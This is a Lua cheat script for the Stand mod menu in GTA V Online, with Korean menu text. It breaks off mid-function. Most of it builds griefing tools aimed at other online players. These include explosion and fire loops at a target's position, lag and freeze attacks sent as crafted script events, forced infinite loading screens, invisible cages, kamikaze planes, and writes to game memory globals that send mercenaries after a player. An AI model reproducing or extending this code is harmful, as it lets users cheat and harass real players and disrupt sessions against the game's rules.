-- This was created by XxpichoclesxX#0427 with some help already mentioned in credits.
-- The original download site should be github.com/xxpichoclesxx, if you got this script from anyone selling it, you got sadly scammed.
-- Also this is only for some new stand people because is a trolling and online feature script, not recovery.
-- So enjoy and pls join my discord, to know when the script is updated or be able to participate in polls.


util.keep_running()
util.require_natives(1663599433)

util.toast("Ryze 스크립트에 오신 걸 환영합니다!")
util.toast("스크립트 로딩중. (1-2s)")
local response = false
local localVer = 3.852
async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
    currentVer = tonumber(output)
    response = true
    if localVer ~= currentVer then
        util.toast("업데이트를 받을 수 있습니다. 업데이트를 다시 시작합니다.")
        menu.action(menu.my_root(), "최신 버전 업데이트(설명 확인 후 실행)", {}, "버전 업데이트시 다시 번역해야 됩니다 신중히 업데이트 하시기 바랍니다.", function()
            async_http.init('raw.githubusercontent.com','/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/Translations/RyzeStand_KOR.lua',function(a)
                local err = select(2,load(a))
                if err then
                    util.toast("Github로 수동 업데이트 진행에 오류가 발생했습니다.")
                return end
                local f = io.open(filesystem.scripts_dir()..SCRIPT_RELPATH, "wb")
                f:write(a)
                f:close()
                util.toast("스크립트 업데이트, 스크립트 다시 시작: 3")
                util.restart_script()
            end)
            async_http.dispatch()
        end)
    end
end, function() response = true end)
async_http.dispatch()
repeat 
    util.yield()
until response

--local required <const> = {
--    "lib/natives-1663599433.lua",
--    "lib/ryzescript/sportmode.lua"
--}
--local scriptdir <const> = filesystem.scripts_dir()
--for _, file in ipairs(required) do
--	assert(filesystem.exists(scriptdir .. file), "archivo requerido no encontrado: " .. file)
--end

--spmode = require "ryzescript.sportmode"

if not SCRIPT_MANUAL_START then
    util.stop_script()
end

sleep(1200)

local modded_vehicles = {
    "dune2",
    "tractor",
    "dilettante2",
    "asea2",
    "cutter",
    "mesa2",
    "jet",
    "skylift",
    "policeold1",
    "policeold2",
    "armytrailer2",
    "towtruck",
    "towtruck2",
    "cargoplane",
}

local modded_weapons = {
    "weapon_railgun",
    "weapon_stungun",
    "weapon_digiscanner",
}

local spawned_objects = {}
local ladder_objects = {}

local remove_projectiles = false
function disableProjectileLoop(projectile)
    util.create_thread(function()
        util.create_tick_handler(function()
            WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
            return remove_projectiles
        end)
    end)
end

function yieldModelLoad(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
end

function rotation_to_direction(rotation) 
    local adjusted_rotation = 
    { 
        x = (math.pi / 180) * rotation.x, 
        y = (math.pi / 180) * rotation.y, 
        z = (math.pi / 180) * rotation.z 
    }
    local direction = 
    {
        x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
        y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
        z =  math.sin(adjusted_rotation.x)
    }
    return direction
end

local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end

local launch_vehicle = {"Lanzar Arriba", "Lanzar Adelante", "Lanzar Atras", "Lanzar Abajo", "Catapulta"}
local invites = {"Yacht", "Office", "Clubhouse", "Office Garage", "Custom Auto Shop", "Apartment"}
local style_names = {"Normal", "Semi-Rushed", "Reverse", "Ignore Lights", "Avoid Traffic", "Avoid Traffic Extremely", "Sometimes Overtake Traffic"}
local drivingStyles = {786603, 1074528293, 8388614, 1076, 2883621, 786468, 262144, 786469, 512, 5, 6}
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}

local function BlockSyncs(player_id, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

local int_min = -2147483647
local int_max = 2147483647

function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, -
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            -1, 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    memory.free(ptr1)
    memory.free(ptr2)
    memory.free(ptr3)
    memory.free(ptr4)
    return {p1, p2, p3, p4}
end

function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    return destination
end

function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2

    if res[1] ~= 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end

    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end

clear_radius = 100
function clear_area(radius)
    target_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    MISC.CLEAR_AREA(target_pos['x'], target_pos['y'], target_pos['z'], radius, true, false, false, false)
end

local function request_ptfx_asset(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        util.yield()
    end
end

local function kick_player_out_of_veh(player_id)
    local max_time = os.millis() + 1000
    local player_ped  = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local kick_vehicle_command_ref = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Kick From Vehicle")
    menu.trigger_command(kick_vehicle_command_ref)

    while PED.IS_PED_IN_ANY_VEHICLE(player_ped) do
        if os.millis() >= max_time then
            break
        end

        util.yield()
    end
end

local function get_transition_state(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
end

local function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 243)) 
end

local function is_player_in_interior(pid)
    return (memory.read_int(memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 243)) ~= 0)
end

local function get_random_pos_on_radius(pos, radius)
    local angle = random_float(0, 2 * math.pi)
    pos = v3.new(pos.x + math.cos(angle) * radius, pos.y + math.sin(angle) * radius, pos.z)
    return pos
end


local function player_toggle_loop(root, player_id, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(player_id) then util.stop_thread() end
        callback()
    end)
end

local function get_blip_coords(blipId)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end

local online = menu.list(menu.my_root(), "온라인", {}, "온라인 모드 옵션")
local world = menu.list(menu.my_root(), "월드", {}, "당신 주변의 선택")
local detections = menu.list(menu.my_root(), "감지", {}, "이름은 w;")
local protects = menu.list(menu.my_root(), "보호", {}, "모더로부터 보호")
local vehicles = menu.list(menu.my_root(), "차량", {}, "차량 옵션")
local fun = menu.list(menu.my_root(), "전환", {}, "심심하면 잠깐 놀아요 : 3")
local misc = menu.list(menu.my_root(), "기타", {}, "유용하고 빠른 지름길")

players.on_join(function(player_id)
    menu.divider(menu.player_root(player_id), "라이즈 스크립트")
    local ryzescriptd = menu.list(menu.player_root(player_id), "라이즈 스크립트")
    local malicious = menu.list(ryzescriptd, "악의가 있는")
    local trolling = menu.list(ryzescriptd, "트롤러")
    local friendly = menu.list(ryzescriptd, "우호적인")
    local vehicle = menu.list(ryzescriptd, "차량")
    local otherc = menu.list(ryzescriptd, "기타")



    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

    local explosion = 18
    local explosion_names = {
        [0] = "소",
        [1] = "중",
        [2] = "대",
        [3] = "특대"
    }

    local explosions = menu.list(malicious, "폭발 방법", {}, "")

    local explode_slider = menu.slider_text(explosions, "폭발", {"customexplode"}, "", explosion_names, function()
        local player_pos = players.get_position(player_id)
        FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
    end)

    util.create_tick_handler(function()
        if not players.exists(player_id) then
            return false
        end

        local index = menu.get_value(explode_slider)

        pluto_switch index do
            case 1:
                explosion = 0
                break
            case 2:
                explosion = 34
                break
            case 3:
                explosion = 82
                break
            pluto_default:
                explosion = 18
        end
    end)

    menu.toggle_loop(explosions, "폭발 반복", {"customexplodeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(explosions, "아토마이저 반복", {"atomizeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 70, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(explosions, "화염기둥 반복", {"fireworkloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
            util.yield(100)
        end
    end)




    local flushes = menu.list(malicious, "반복", {}, "")

    menu.toggle_loop(flushes, "불기둥 반복", {"flameloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 12, 1, true, false, 1, false)
            util.yield()
        end
    end)

    menu.toggle_loop(flushes, "물기둥 반복", {"waterloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 13, 1, true, false, 1, false)
            util.yield()
        end
    end)




    menu.divider(malicious, "기타")

    local lagplay = menu.list(malicious, "라지 플레이어", {}, "")

    menu.toggle_loop(lagplay, "방법 V1", {"rlag"}, "플레이어를 정지시켜 작동시키십시오.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "방법 V2", {"rlag2"}, "플레이어를 정지시켜 작동시키십시오.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "방법 V3", {"rlag3"}, "플레이어를 정지시켜 작동시키십시오.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "방법 V4", {"rlag4"}, "플레이어를 정지시켜 작동시키십시오.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_anim_bm_water_mist", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    --menu.toggle_loop(lagplay, "방법 V5", {rlag5}, "도면요소별 위치", function()
	--	local player_pos = players.get_position(player_id)
	--	request_ptfx_asset("scr_rcbarry2")
	--	GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
	--	GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
    --        "scr_clown_death", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
	--	request_ptfx_asset("scr_rcbarry2")
	--	GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
	--	GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
    --        "scr_exp_clown", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
	--	request_ptfx_asset("scr_ch_finale")
    --   GRAPHICS.USE_PARTICLE_FX_ASSET("scr_ch_finale")
	--	GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
	--		"scr_ch_finale_drill_sparks", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    --    request_ptfx_asset("scr_ch_finale")
    --    while not STREAMING.HAS_MODEL_LOADED(447548909) do
	--		STREAMING.REQUEST_MODEL(447548909)
	--		end
	--	local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	--	local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
	--	spam_amount = 1000
	--	while spam_amount >= 2 do
	--		entities.create_vehicle(447548909, PlayerPedCoords, 0)
	--		spam_amount = spam_amount - 2
	--	end
	--end)

    local cageveh = menu.list(trolling, "케이지 자동차", {}, "")

    menu.action(cageveh, "차량 케이지", {"cage"}, "", function()
        local container_hash = util.joaat("boxville3")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.SET_ENTITY_VISIBLE(container, false)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)


    local cage = menu.list(trolling, "플레이어 케이지", {}, "")
    menu.action(cage, "전기 케이지", {"electriccage"}, "", function(cl)
        local number_of_cages = 6
        local elec_box = util.joaat("prop_elecbox_12")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.5)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)
    
    menu.action(cage, "관 케이지", {""}, "", function(cl)
        local number_of_cages = 6
        local coffin_hash = util.joaat("prop_coffin_02b")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(coffin_hash)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.8)
            obj_pos:add(pos)
            obj_pos.z += 0.1
           local coffin = entities.create_object(coffin_hash, obj_pos)
           spawned_objects[#spawned_objects + 1] = coffin
           ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
           ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
        end
    end)

    menu.action(cage, "화물 컨테이너", {"cage"}, "", function()
        local container_hash = util.joaat("prop_container_ld_pu")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        pos.z -= 1
        local container = entities.create_object(container_hash, pos, 0)
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)


    menu.action(cage, "케이지 삭제", {"clearcages"}, "", function()
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount += 1
        end
        util.toast("케이지 " .. entitycount .. " 삭제")
    end)

    menu.action(trolling, "플레이어 얼리기", {""}, "", function(cl)
        local number_of_cages = 10
        local ladder_hash = util.joaat("prop_towercrane_02el2")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        request_model(ladder_hash)
        
        if TASK.IS_PED_STILL(ped) then
            util.toast("플레이어는 가만히 있다.")
        return end

        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.25)
            obj_pos:add(pos)
            local ladder = entities.create_object(ladder_hash, obj_pos)
            ladder_objects[#ladder_objects + 1] = ladder
            ENTITY.SET_ENTITY_VISIBLE(ladder, false)
            ENTITY.SET_ENTITY_ROTATION(ladder, 0.0, 0.0, angle, 2, 0)
            ENTITY.FREEZE_ENTITY_POSITION(ladder, true)
        end
        util.yield(2500)
        for i, object in ipairs(ladder_objects) do
            entities.delete_by_handle(object)
        end
    end)




    menu.divider(trolling, "기타")

    local inf_loading = menu.list(trolling, "무한전하 스크린", {}, "")
    menu.action(inf_loading, "Teleport a MC", {}, "", function()
        util.trigger_script_event(1 << player_id, {0xDEE5ED91, player_id, 0, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(inf_loading, "아파트 방법론", {}, "", function()
        util.trigger_script_event(1 << player_id, {0x7EFC3716, player_id, 0, 1, id})
    end)
        
    menu.action_slider(inf_loading, "부패한 전화", {}, "스타일 선택 클릭", invites, function(index, name)
        pluto_switch name do
            case 1:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x1})
                util.toast("요트 초대")
            break
            case 2:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x2})
                util.toast("사무소 초대")
            break
            case 3:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x3})
                util.toast("클럽 초대장")
            break
            case 4:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x4})
                util.toast("사무용 차고 초대")
            break
            case 5:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x5})
                util.toast("성자 Cs 초대")
            break
            case 6:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x6})
                util.toast("아파트 초대장")
            break
        end
    end)


    local freeze = menu.list(malicious, "얼리기 방법", {}, "")

    player_toggle_loop(freeze, player_id, "강력(Ryze의 어떤 메뉴/배제 제외)", {}, "", function()
        util.trigger_script_event(1 << player_id, {0x4868BC31, player_id, 0, 0, 0, 0, 0})
        util.yield(500)
    end)

    player_toggle_loop(freeze, player_id, "프리제 V1 (대부분 차단됨)", {}, "", function()
        util.trigger_script_event(1 << player_id, {0x7EFC3716, player_id, 0, 1, 0, 0})
        util.yield(500)
    end)

    --player_toggle_loop(freeze, player_id, "Freeze V2 (Bloqueado por populares)", {}, "", function()
    --    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    --    TASK.CLEAR_PED_TASKS_IMMEDIATELY(player_id)
    --end)


    local options <const> = {"Lazer", "Mammatus",  "Cuban800"}
	menu.action_slider(malicious, ("Kamikaze"), {}, "", options, function (index, plane)
		local hash <const> = util.joaat(plane)
		request_model(hash)
		local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
		local pos = players.get_position(targetPed, 20.0, 20.0)
		pos.z = pos.z + 30.0
		local plane = entities.create_vehicle(hash, pos, 0.0)
		players.get_position(plane, targetPed, true)
		VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150.0)
		VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
	end)


    local msg = ("용병들은 이미 그를 따르고 있다.")

	menu.action(trolling, ("용병 보내기"), {}, "", function()
		if NETWORK.NETWORK_IS_SESSION_STARTED() and NETWORK.NETWORK_IS_PLAYER_ACTIVE(pid) and
		not PED.IS_PED_INJURED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)) and not is_player_in_interior(player_id) then

			if not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 1, true, 0) then
				local bits_addr = memory.script_global(1853348 + (players.user() * 834 + 1) + 140)
				memory.write_int(bits_addr, SetBit(memory.read_int(bits_addr), 1))
				write_global.int(1853348 + (players.user() * 834 + 1) + 141, pid)
			else
				notification:help(msg, HudColour.red)
			end
		end
	end) 

    menu.action(trolling, "안에서 죽이다", {}, "아파트에서는 ​​작동하지 않습니다 (Love u jinx x2)", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)

        for i, interior in ipairs(interior_stuff) do
            if get_interior_player_is_in(player_id) == interior then
                util.toast("플레이어가 내부에 없습니다.")
            return end
            if get_interior_player_is_in(player_id) ~= interior then
                util.trigger_script_event(1 << player_id, {0xAD36AA57, player_id, 0x96EDB12F, math.random(0, 0x270F)})
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
            end
        end
    end)

    glitchiar = menu.list(trolling, "글리치 옵션", {}, "")


    player_toggle_loop(glitchiar, player_id, "버그 움직임", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        request_model(glitch_hash)
        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        entities.delete_by_handle(dumb_object_front)
        entities.delete_by_handle(dumb_object_back)
        util.yield()    
    end)


    local glitch_player_list = menu.list(glitchiar, "글리칭 플레이어", {"glitchdelay"}, "")
    local object_stuff = {
        names = {
            "페리스 휠",
            "UFO",
            "시멘트 믹서",
            "스카폴딩",
            "트렁그 문",
            "큰 볼링공",
            "큰 축구공",
            "큰 노랑공",
            "스턴트 램프",

        },
        objects = {
            "prop_ld_ferris_wheel",
            "p_spinning_anus_s",
            "prop_staticmixer_01",
            "prop_towercrane_02a",
            "des_scaffolding_root",
            "prop_sm1_11_garaged",
            "stt_prop_stunt_bowling_ball",
            "stt_prop_stunt_soccer_ball",
            "prop_juicestand",
            "stt_prop_stunt_jump_l",
        }
    }

    local object_hash = util.joaat("prop_ld_ferris_wheel")
    menu.list_select(glitch_player_list, "객체", {"glitchplayer"}, "글라이딩 대상입니다.", object_stuff.names, 1, function(index)
        object_hash = util.joaat(object_stuff.objects[index])
    end)

    menu.slider(glitch_player_list, "델레이 드 숀", {"spawndelay"}, "", 0, 3000, 50, 10, function(amount)
        delay = amount
    end)

    local glitchPlayer = false
    local glitchPlayer_toggle
    glitchPlayer_toggle = menu.toggle(glitch_player_list, "플레이어", {}, "", function(toggled)
        glitchPlayer = toggled

        while glitchPlayer do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("멀리 떨어진 선수. :c")
                menu.set_value(glitchPlayer_toggle, false);
            break end

            if not players.exists(player_id) then 
                util.toast("플레이어는 존재하지 않습니다. :c")
                menu.set_value(glitchPlayer_toggle, false);
            break end
            local glitch_hash = object_hash
            local poopy_butt = util.joaat("rallytruck")
            request_model(glitch_hash)
            request_model(poopy_butt)
            local stupid_object = entities.create_object(glitch_hash, pos)
            local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(delay)
            entities.delete_by_handle(stupid_object)
            entities.delete_by_handle(glitch_vehicle)
            util.yield(delay)    
        end
    end)

    local glitchVeh = false
    local glitchVehCmd
    glitchVehCmd = menu.toggle(glitchiar, "글리치 차량", {"glitchvehicle"}, "", function(toggle) -- jinx <3
        glitchVeh = toggle
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(player_id)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        request_model(ped_hash)
        request_model(object_hash)
        
        while glitchVeh do
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("멀리 떨어진 선수. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not players.exists(player_id) then 
                util.toast("플레이어는 존재하지 않습니다. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then 
                util.toast("그 선수는 차에 있지 않습니다. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("자리가 없어요. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}

